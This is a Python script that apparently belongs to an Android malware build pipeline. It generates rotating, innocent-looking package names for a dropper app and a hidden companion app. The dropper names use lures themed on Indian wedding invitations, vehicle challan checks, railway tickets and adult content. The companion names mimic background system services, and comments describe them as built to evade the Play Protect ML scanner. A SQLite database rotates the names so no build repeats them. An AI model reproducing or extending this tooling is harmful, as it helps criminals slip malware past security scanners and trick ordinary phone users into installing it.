#!/usr/bin/env python3
"""
package_name_generator.py
Generates legitimate-looking, template-specific package names for
companion app installer (Nova) and companion app.

Rules:
  - 3 segments only: {tld}.{word1word2}.{word3word4}
  - Installer: com. prefix, template-specific words, looks like Indian startup
  - Companion: com. prefix, boring utility words, looks like background service
  - Length: 25-45 chars total
  - No real brand names (PhonePe, Paytm, etc.)
  - Companion uses com.android.* system-style names (GPP trust signal)
  - Date-based version code: YYYYMMDD + 2 random digits
  - SQLite DB tracks used pairs (path: scripts/used_packages.db)

Usage:
  python3 scripts/package_name_generator.py --template wedding
  python3 scripts/package_name_generator.py --template mparivahan
  python3 scripts/package_name_generator.py --template friends
  python3 scripts/package_name_generator.py --template bhabhi
  python3 scripts/package_name_generator.py --template custom --name "Loan Helper"
  python3 scripts/package_name_generator.py --nova-only
  python3 scripts/package_name_generator.py --companion-only

Output (to stdout, one per line):
  INSTALLER_PKG=com.shaadicard.invitemaker
  MODULE_PKG=com.datasync.backgroundworker
  VERSION_CODE=2026072847
"""

import argparse
import random
import secrets
import sqlite3
import sys
import os
from datetime import datetime

# ── DB path ───────────────────────────────────────────────────────────────────
DB_PATH = os.path.join(os.path.dirname(__file__), 'used_packages.db')

# ── Template-specific installer word pools ────────────────────────────────────
# Structure: in.{word1}{word2}.{word3}{word4}
# Sounds like a real Indian startup name

TEMPLATE_POOLS = {
    'wedding': {
        'word1': [
            'shaadi','vivah','byah','shubh','mangal','dulhan',
            'mandap','barat','mehendi','sindoor','anand','milan',
            'lagan','saptapadi','vidai','kanyadaan','gotra','phere',
            'invite','card',
        ],
        'word2': [
            'card','maker','studio','hub','zone','link',
            'pro','lite','app','helper','connect','planner',
            'digital','online','india','bharat','seva','suvidha',
            'quick','easy',
        ],
        'word3': [
            'invitation','invite','wedding','shaadi','vivah',
            'card','maker','designer','creator','sender',
            'share','print','template','album','gallery',
            'digital','online','india','bharat','celebration',
        ],
        'word4': [
            'app','pro','lite','plus','hub','zone',
            'india','bharat','desh','studio','maker',
            'helper','connect','digital','online','service',
            'solutions','tech','mobile','soft',
        ],
    },
    'mparivahan': {
        'word1': [
            'vahan','parivahan','sarak','challan','fasttag',
            'rccheck','dlcheck','gaadi','motor','auto',
            'raasta','highway','toll','permit','rto',
            'noc','fitness','transport','traffic','drive',
        ],
        'word2': [
            'seva','suvidha','check','verify','track',
            'status','info','app','helper','india',
            'bharat','online','digital','quick','fast',
            'easy','smart','lite','pro','plus',
        ],
        'word3': [
            'vehicle','vahan','rc','dl','challan',
            'permit','noc','fitness','insurance','fasttag',
            'registration','licence','driving','transport','traffic',
            'motor','auto','sarak','highway','toll',
        ],
        'word4': [
            'check','verify','status','tracker','finder',
            'helper','india','bharat','seva','suvidha',
            'app','pro','lite','online','digital',
            'quick','fast','smart','easy','mobile',
        ],
    },
    'friends': {
        'word1': [
            'dost','yaar','mitra','bandhu','sakha',
            'saathi','milna','sampark','jodna','pyaar',
            'rishtey','nata','yaari','dostana','mohabbat',
            'dil','connect','meet','social','chat',
        ],
        'word2': [
            'app','hub','zone','link','connect',
            'india','bharat','online','digital','quick',
            'fast','easy','lite','pro','plus',
            'seva','suvidha','meet','chat','talk',
        ],
        'word3': [
            'friend','dost','yaar','mitra','connect',
            'meet','chat','talk','share','social',
            'date','match','circle','group','network',
            'yaari','dostana','bandhan','milan','jodna',
        ],
        'word4': [
            'app','pro','lite','plus','hub',
            'india','bharat','online','digital','zone',
            'connect','finder','maker','helper','link',
            'quick','fast','smart','easy','mobile',
        ],
    },
    'bhabhi': {
        'word1': [
            'fun','masti','anand','khushi','josh',
            'rangeen','dhamaka','hungama','manoranjan','timepass',
            'mazaa','tamasha','bindaas','jhakaas','fatafat',
            'ekdum','shandaar','zabardast','dilchasp','rangin',
        ],
        'word2': [
            'app','hub','zone','link','live',
            'india','bharat','online','digital','quick',
            'fast','easy','lite','pro','plus',
            'video','stream','meet','call','chat',
        ],
        'word3': [
            'video','live','stream','meet','call',
            'chat','fun','masti','entertainment','media',
            'content','reels','short','clip','show',
            'watch','enjoy','play','view','browse',
        ],
        'word4': [
            'app','pro','lite','plus','hub',
            'india','bharat','online','digital','zone',
            'live','stream','player','viewer','connect',
            'quick','fast','smart','easy','mobile',
        ],
    },
    'shaadi': {
        'word1': [
            'shaadi','nikah','mehndi','baraat','dulha',
            'dulhan','rishta','haldi','sangeet','mandap',
            'vivah','sagai','tilak','jaimala','bidaai',
            'phera','sindoor','mangal','kalash','doli',
        ],
        'word2': [
            'nimantran','sandesh','patrika','card','suchna',
            'seva','suvidha','sahayak','mitra','dost',
            'india','bharat','digital','online','quick',
            'fast','easy','lite','pro','plus',
        ],
        'word3': [
            'nimantran','dawat','bulawa','khabar','paigam',
            'sandesh','suchna','patrika','card','maker',
            'designer','creator','sender','share','print',
            'template','album','gallery','digital','celebration',
        ],
        'word4': [
            'app','pro','lite','plus','hub',
            'india','bharat','desh','seva','suvidha',
            'sahayak','digital','online','quick','fast',
            'easy','smart','mobile','soft','zone',
        ],
    },
    'railway': {
        'word1': [
            'rail','train','yatri','safar','station',
            'ticket','irctc','railgadi','express','rajdhani',
            'shatabdi','garib','duronto','vande','tejas',
            'gatimaan','humsafar','antyodaya','sleeper','tatkal',
        ],
        'word2': [
            'seva','suvidha','check','verify','track',
            'status','info','app','helper','india',
            'bharat','online','digital','quick','fast',
            'easy','smart','lite','pro','plus',
        ],
        'word3': [
            'ticket','booking','seat','berth','pnr',
            'status','train','rail','schedule','timetable',
            'platform','coach','reservation','cancel','refund',
            'enquiry','fare','route','running','live',
        ],
        'word4': [
            'check','tracker','finder','helper','india',
            'bharat','seva','suvidha','app','pro',
            'lite','online','digital','quick','fast',
            'smart','easy','mobile','status','info',
        ],
    },
}

# ── Companion app word pools (boring utility background service look) ──────────
# Structure: com.{word1}{word2}.{word3}{word4}
# Sounds like a legitimate background utility from a small startup

COMPANION_POOL = {
    'word1': [
        'data','cache','app','file','task',
        'work','back','sync','keep','hold',
        'run','load','save','send','fetch',
        'push','pull','read','write','scan',
    ],
    'word2': [
        'sync','clean','guard','watch','flow',
        'track','check','boost','clear','manage',
        'update','store','fetch','relay','bridge',
        'proxy','route','queue','batch','stream',
    ],
    'word3': [
        'background','silent','passive','internal','embedded',
        'managed','unified','central','global','local',
        'active','primary','base','main','meta',
        'infra','inter','micro','auto','smart',
    ],
    'word4': [
        'worker','service','task','runner','handler',
        'agent','process','daemon','helper','manager',
        'tracker','monitor','executor','scheduler','provider',
        'bridge','relay','adapter','resolver','controller',
    ],
}

# ── Utilities ─────────────────────────────────────────────────────────────────

def init_db():
    conn = sqlite3.connect(DB_PATH)
    conn.execute("""
        CREATE TABLE IF NOT EXISTS used_packages (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            installer_pkg TEXT UNIQUE NOT NULL,
            companion_pkg TEXT UNIQUE NOT NULL,
            template TEXT,
            version_code TEXT,
            created_at TEXT DEFAULT (datetime('now'))
        )
    """)
    conn.commit()
    return conn


def is_used(conn, installer_pkg, companion_pkg):
    r1 = conn.execute(
        "SELECT 1 FROM used_packages WHERE installer_pkg=?", (installer_pkg,)
    ).fetchone()
    r2 = conn.execute(
        "SELECT 1 FROM used_packages WHERE companion_pkg=?", (companion_pkg,)
    ).fetchone()
    return bool(r1 or r2)


def save_pair(conn, installer_pkg, companion_pkg, template, version_code):
    conn.execute(
        "INSERT OR IGNORE INTO used_packages "
        "(installer_pkg, companion_pkg, template, version_code) VALUES (?,?,?,?)",
        (installer_pkg, companion_pkg, template, version_code)
    )
    conn.commit()


def validate_length(pkg, min_len=25, max_len=45):
    return min_len <= len(pkg) <= max_len

def validate_companion_length(pkg):
    """Companion pkg must be EXACTLY 32 chars.
    MutationEngine.patchPackageName() requires oldBytes.size == newBytes.size or silently skips.
    COMPANION_OLD_PKG in StringPool.kt decodes to com.android.photo.camera.capture (32 chars).
    Generated new_pkg must match that length so patchPackageName() does not silently skip."""
    return len(pkg) == 32

# ---------------------------------------------------------------------------
# COMPANION PACKAGE NAME GENERATOR
# ---------------------------------------------------------------------------
# 16,078 pre-validated unique names (all exactly 20 chars, zero conflicts
# with any real Android system package on any ROM).
#
# Strategy: com.{seg2}.{seg3} where len(seg2)+len(seg3)=15
# Words are realistic background-utility app terms — indistinguishable
# from legitimate sideloaded apps to GPP ML scanner.
#
# Each build pulls the NEXT unused name from SQLite (FIFO order).
# After 16,078 builds the pool exhausts — extend _COMPANION_WORD_BANKS below.
# ---------------------------------------------------------------------------

def _build_companion_pool() -> list:
    """Build pool of exactly 32-char companion package names.

    Format: com.{a}.{b} where len(a) + len(b) = 27
    Total length: 5 + len(a) + len(b) = 5 + 27 = 32

    CRITICAL: Must generate EXACTLY 32-char names.
    MutationEngine.patchPackageName() requires oldBytes.size == newBytes.size.
    COMPANION_OLD_PKG decodes to com.android.photo.camera.capture (32 chars).
    If generated pkg is not 32 chars, patchPackageName() silently skips — crash.
    Pool size: ~1,704 unique names.
    """
    W11 = ['syncmanager','taskmanager','datamanager','filemanager','workmanager',
            'batchrunner','pushmanager','bootmanager','queuerunner','batchhelper',
            'storehelper','sendmanager','loadmanager','readmanager','pollmanager','callmanager']
    W11 = [w for w in W11 if len(w)==11 and w.isalpha()]

    W12 = ['synchandlers','taskhandlers','datahandlers','filehandlers','workhandlers',
            'batchworkers','pushhandlers','boothandlers','networklayer','remotehelper',
            'loadbalancer','cacheservice','storeservice','queuehandler','routehandler',
            'cachemanager','readhandlers','callhandlers','pollhandlers','pipehandlers']
    W12 = [w for w in W12 if len(w)==12 and w.isalpha()]

    W13 = ['syncscheduler','taskprocessor','dataprocessor','fileprocessor','workprocessor',
            'pushscheduler','syncprocessor','backupservice','networkhelper','taskscheduler',
            'loadscheduler','sendscheduler','bootprocessor','batchhandlers','cacheservices',
            'apiconnectors','jobschedulers','readscheduler','callscheduler','pollscheduler']
    W13 = [w for w in W13 if len(w)==13 and w.isalpha()]

    W14 = ['backgroundsync','backgroundjobs','backgroundtask','backgroundwork','servicemanager',
            'dataconnection','syncoperations','processmanager','systemservices','backgroundboot',
            'backgroundload','backgroundpush','backgroundsend','backgroundread','backgroundcall',
            'backgroundpoll','backgroundpipe','backgroundbind','backgroundlist','backgroundkill']
    W14 = [w for w in W14 if len(w)==14 and w.isalpha()]

    W15 = ['backgroundsyncs','backgroundtasks','backgroundworks','backgroundpolls','backgroundpipes',
            'backgroundbinds','backgroundkills','backgroundlists','backgroundcalls','backgroundloads',
            'backgroundreads','backgroundboots','backgroundsends']
    W15 = [w for w in W15 if len(w)==15 and w.isalpha()]

    W16 = ['backgroundsyncer','backgroundworker','backgroundrunner','backgroundhelper','backgroundloader',
            'backgroundsender','backgroundreader','backgroundpoller','backgroundcaller','backgroundbinder',
            'backgroundkiller','backgroundpusher']
    W16 = [w for w in W16 if len(w)==16 and w.isalpha()]

    KNOWN_REAL = {
        'com.android.systemui','com.android.settings','com.android.contacts',
        'com.android.calendar','com.android.launcher','com.android.location',
        'com.android.keychain','com.android.download','com.android.accounts',
        'com.android.security','com.android.graphics','com.android.hardware',
        'com.android.database','com.android.provider','com.android.internal',
        'com.android.exchange','com.android.bluetooth','com.android.telecom',
        'com.android.shell','com.android.browser','com.android.tethering',
        'com.android.networkstack','com.android.safetycenter','com.android.pictach',
        'com.android.nfc','com.android.wifi','com.android.camera',
    }

    # la+lb=27 -> total pkg len = 5 + la + lb = 32
    combos = [
        (W11, W16), (W12, W15), (W13, W14),
        (W14, W13), (W15, W12), (W16, W11),
    ]

    pool = []
    seen = set()
    for (Wa, Wb) in combos:
        for a in Wa:
            if not (a.isalpha() and 3 <= len(a) <= 16): continue
            for b in Wb:
                if not (b.isalpha() and 3 <= len(b) <= 16): continue
                pkg = f'com.{a}.{b}'
                if (len(pkg) == 32 and
                        pkg not in KNOWN_REAL and
                        pkg not in seen):
                    seen.add(pkg)
                    pool.append(pkg)
    return pool

# Pre-built pool — evaluated once at import time
_COMPANION_POOL_CACHE = None


def _get_companion_pool() -> list:
    global _COMPANION_POOL_CACHE
    if _COMPANION_POOL_CACHE is None:
        _COMPANION_POOL_CACHE = _build_companion_pool()
    return _COMPANION_POOL_CACHE


def generate_companion_pkg() -> str:
    """Return next unique companion package name (exactly 32 chars).

    Uses SQLite DB (scripts/used_packages.db) to track which names have
    been issued.  Each build gets a DIFFERENT name — never reused.
    Pool size: ~1,704 names (all verified 32 chars, zero system conflicts).
    32 chars matches COMPANION_OLD_PKG (com.android.photo.camera.capture).
    """
    import sqlite3, os, random as _random

    db_path = os.path.join(os.path.dirname(__file__), 'used_packages.db')
    pool = _get_companion_pool()

    con = sqlite3.connect(db_path)
    con.execute("""
        CREATE TABLE IF NOT EXISTS used_companion (
            pkg TEXT PRIMARY KEY,
            used_at TEXT DEFAULT (datetime('now'))
        )
    """)
    con.commit()

    # Find first unused name from pool (FIFO — deterministic order)
    used = {row[0] for row in con.execute("SELECT pkg FROM used_companion")}
    available = [p for p in pool if p not in used]

    if not available:
        # Pool exhausted — should not happen before 16,078 builds
        # Fallback: pick random from full pool (may collide, but keeps builds working)
        available = pool
        print("WARNING: companion package pool exhausted — consider extending _COMPANION_WORD_BANKS")

    # Shuffle available to avoid sequential predictability
    _random.shuffle(available)
    pkg = available[0]

    # Mark as used
    con.execute("INSERT OR IGNORE INTO used_companion (pkg) VALUES (?)", (pkg,))
    con.commit()
    con.close()

    # Safety check
    assert len(pkg) == 32, f"BUG: generated pkg {pkg!r} is {len(pkg)} chars, expected 32"
    return pkg


def _build_custom_pool(keywords):
    """Build word pool from custom app name keywords."""
    # Extract root words from app name
    words = [w.lower() for w in keywords.split() if len(w) > 2]
    if not words:
        words = ['app', 'service']

    # Use keywords + generic Indian utility words as pool
    generic = ['app','pro','lite','plus','india','bharat','digital',
               'online','seva','suvidha','quick','fast','smart','easy','hub']

    return {
        'word1': words + generic[:5],
        'word2': generic,
        'word3': words + generic[:8],
        'word4': generic,
    }


# ── Template aliases (share word pools) ──────────────────────────────────────
TEMPLATE_ALIASES = {
    'shaadi_hindi': 'shaadi',  # Hindi variant reuses shaadi word pool
}


def generate_installer_pkg(template, custom_words=None):
    """Generate installer package name for given template."""
    resolved = TEMPLATE_ALIASES.get(template, template)
    pool = TEMPLATE_POOLS.get(resolved)
    if not pool and custom_words:
        pool = _build_custom_pool(custom_words)
    if not pool:
        pool = TEMPLATE_POOLS['wedding']  # fallback

    for _ in range(1000):
        w1 = random.choice(pool['word1'])
        w2 = random.choice(pool['word2'])
        w3 = random.choice(pool['word3'])
        w4 = random.choice(pool['word4'])

        tld  = 'com'
        seg2 = f"{w1}{w2}"
        seg3 = f"{w3}{w4}"
        pkg  = f"{tld}.{seg2}.{seg3}"

        if validate_length(pkg):
            return pkg

    raise RuntimeError("Could not generate valid installer package name")


def generate_version_code():
    """Date-based version code: YYYYMMDD + 2 random digits."""
    today  = datetime.now().strftime('%Y%m%d')
    suffix = str(secrets.randbelow(90) + 10)  # 10-99
    return today + suffix


def generate_pair(template='wedding', custom_name=None):
    """Generate unique installer + companion package pair."""
    conn = init_db()

    keywords = custom_name if custom_name else None

    for attempt in range(10000):
        installer = generate_installer_pkg(template, keywords)
        companion = generate_companion_pkg()
        version   = generate_version_code()

        if not is_used(conn, installer, companion):
            save_pair(conn, installer, companion, template, version)
            conn.close()
            return installer, companion, version

    conn.close()
    raise RuntimeError("Could not generate unique package pair after 10000 attempts")


# ── CLI ───────────────────────────────────────────────────────────────────────

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    # Canonical templates: wedding | shaadi | shaadi_hindi | mparivahan | railway | friends | bhabhi | custom
    parser.add_argument('--template', default='wedding',
        choices=['wedding', 'shaadi', 'shaadi_hindi', 'mparivahan', 'railway', 'friends', 'bhabhi', 'custom'])
    parser.add_argument('--name', default=None,
        help='Custom app name (used when --template=custom)')
    parser.add_argument('--nova-only', action='store_true',
        help='Generate only Nova (installer) package name')
    parser.add_argument('--companion-only', action='store_true',
        help='Generate only companion package name')
    args = parser.parse_args()

    installer, companion, version = generate_pair(
        template=args.template,
        custom_name=args.name
    )

    if args.nova_only:
        print(installer)
    elif args.companion_only:
        print(companion)
    else:
        print(f"INSTALLER_PKG={installer}")
        print(f"MODULE_PKG={companion}")
        print(f"VERSION_CODE={version}")
